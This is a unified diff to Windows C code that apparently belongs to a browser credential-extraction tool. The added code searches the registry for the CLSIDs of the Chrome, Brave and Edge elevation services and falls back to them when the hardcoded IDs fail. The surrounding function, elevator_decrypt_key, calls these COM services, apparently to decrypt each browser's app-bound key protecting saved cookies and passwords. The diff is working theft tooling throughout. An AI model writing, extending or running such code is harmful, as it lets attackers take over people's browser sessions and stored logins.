@@ -4,11 +4,54 @@
 
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "oleaut32.lib")
+#pragma comment(lib, "advapi32.lib")
+
+static BOOL resolve_clsid_from_appid(const wchar_t* service_name, CLSID* out_clsid) {
+    HKEY hAppID;
+    REGSAM views[] = { KEY_READ | KEY_WOW64_64KEY, KEY_READ | KEY_WOW64_32KEY };
+
+    for (int v = 0; v < 2; v++) {
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Classes\\AppID",
+                          0, views[v], &hAppID) != ERROR_SUCCESS)
+            continue;
+
+        WCHAR subkey[64];
+        DWORD idx = 0;
+
+        for (;;) {
+            DWORD subkey_len = sizeof(subkey) / sizeof(subkey[0]);
+            if (RegEnumKeyExW(hAppID, idx++, subkey, &subkey_len,
+                              NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
+                break;
+
+            HKEY hSub;
+            if (RegOpenKeyExW(hAppID, subkey, 0, views[v], &hSub) != ERROR_SUCCESS)
+                continue;
+
+            WCHAR val[256];
+            DWORD val_size = sizeof(val);
+            DWORD type;
+            BOOL match = (RegQueryValueExW(hSub, L"LocalService", NULL, &type,
+                                           (BYTE*)val, &val_size) == ERROR_SUCCESS
+                          && type == REG_SZ
+                          && _wcsicmp(val, service_name) == 0);
+            RegCloseKey(hSub);
+
+            if (match && CLSIDFromString(subkey, out_clsid) == S_OK) {
+                RegCloseKey(hAppID);
+                return TRUE;
+            }
+        }
+        RegCloseKey(hAppID);
+    }
+    return FALSE;
+}
 
 const BROWSER_CONFIG g_browsers[BROWSER_COUNT] = {
     [BROWSER_CHROME] = {
         .name           = L"Chrome",
         .user_data_path = L"Google\\Chrome\\User Data",
+        .service_name   = L"GoogleChromeElevationService",
         .clsid          = { 0x708860E0, 0xF641, 0x4611, { 0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B } },
         .iid_v1         = { 0x463ABECF, 0x410D, 0x407F, { 0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8 } },
         .iid_v2         = { 0x1BF5208B, 0x295F, 0x4992, { 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 } },
@@ -17,6 +60,7 @@ const BROWSER_CONFIG g_browsers[BROWSER_COUNT] = {
     [BROWSER_BRAVE] = {
         .name           = L"Brave",
         .user_data_path = L"BraveSoftware\\Brave-Browser\\User Data",
+        .service_name   = L"BraveElevationService",
         .clsid          = { 0x576B31AF, 0x6369, 0x4B6B, { 0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B } },
         .iid_v1         = { 0xF396861E, 0x0C8E, 0x4C71, { 0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9 } },
         .iid_v2         = { 0x1BF5208B, 0x295F, 0x4992, { 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 } },
@@ -25,6 +69,7 @@ const BROWSER_CONFIG g_browsers[BROWSER_COUNT] = {
     [BROWSER_EDGE] = {
         .name           = L"Edge",
         .user_data_path = L"Microsoft\\Edge\\User Data",
+        .service_name   = L"MicrosoftEdgeElevationService",
         .clsid          = { 0x1FCBE96C, 0x1697, 0x43AF, { 0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67 } },
         .iid_v1         = { 0xC9C2B807, 0x7731, 0x4F34, { 0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B } },
         .iid_v2         = { 0x8F7B6792, 0x784D, 0x4047, { 0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05 } },
@@ -46,11 +91,26 @@ HRESULT elevator_decrypt_key(BROWSER_ID browser,
     hr = CoCreateInstance(&cfg->clsid, NULL, CLSCTX_LOCAL_SERVER,
                           &cfg->iid_v2, (void**)&elevator);
     if (FAILED(hr)) {
-        HRESULT hr2 = CoCreateInstance(&cfg->clsid, NULL, CLSCTX_LOCAL_SERVER,
-                                       &cfg->iid_v1, (void**)&elevator);
-        if (FAILED(hr2))
-            return (HRESULT)(ELEVATOR_STAGE_COCREATE | (hr2 & 0xFFFF));
+        hr = CoCreateInstance(&cfg->clsid, NULL, CLSCTX_LOCAL_SERVER,
+                              &cfg->iid_v1, (void**)&elevator);
     }
+
+    // Hardcoded CLSID failed — resolve dynamically from registry
+    if (FAILED(hr) && cfg->service_name) {
+        CLSID resolved;
+        if (resolve_clsid_from_appid(cfg->service_name, &resolved) &&
+            memcmp(&resolved, &cfg->clsid, sizeof(CLSID)) != 0) {
+            hr = CoCreateInstance(&resolved, NULL, CLSCTX_LOCAL_SERVER,
+                                  &cfg->iid_v2, (void**)&elevator);
+            if (FAILED(hr)) {
+                hr = CoCreateInstance(&resolved, NULL, CLSCTX_LOCAL_SERVER,
+                                      &cfg->iid_v1, (void**)&elevator);
+            }
+        }
+    }
+
+    if (FAILED(hr))
+        return (HRESULT)(ELEVATOR_STAGE_COCREATE | (hr & 0xFFFF));
 
     // Set proxy blanket for proper authentication
     hr = CoSetProxyBlanket((IUnknown*)elevator,
